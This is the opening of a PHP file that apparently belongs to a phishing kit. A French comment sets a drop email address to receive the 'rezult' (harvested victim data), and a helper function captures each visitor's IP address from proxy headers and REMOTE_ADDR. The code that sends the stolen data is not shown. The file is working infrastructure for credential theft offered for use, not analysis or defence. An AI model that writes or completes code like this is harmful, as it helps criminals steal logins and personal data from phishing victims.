<?php 


$my_mail="arah.albedo@protonmail.com";   // Votre E-Mail pour recup rezult
function _ip() {
            $ipaddress = '';
            if(getenv('HTTP_CLIENT_IP')){
                $ipaddress = getenv('HTTP_CLIENT_IP');
            }
            elseif(getenv('HTTP_X_FORWARDED_FOR')){
                $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
            }
            elseif(getenv('HTTP_X_FORWARDED')){
                $ipaddress = getenv('HTTP_X_FORWARDED');
            }
            elseif(getenv('HTTP_FORWARDED_FOR')){
                $ipaddress = getenv('HTTP_FORWARDED_FOR');
            }
            elseif(getenv('HTTP_FORWARDED')){
               $ipaddress = getenv('HTTP_FORWARDED');
            }
            elseif(getenv('REMOTE_ADDR')){
                $ipaddress = getenv('REMOTE_ADDR');
            }
            else{
                $ipaddress = 'UNKNOWN';
            }
            return $ipaddress;
        }
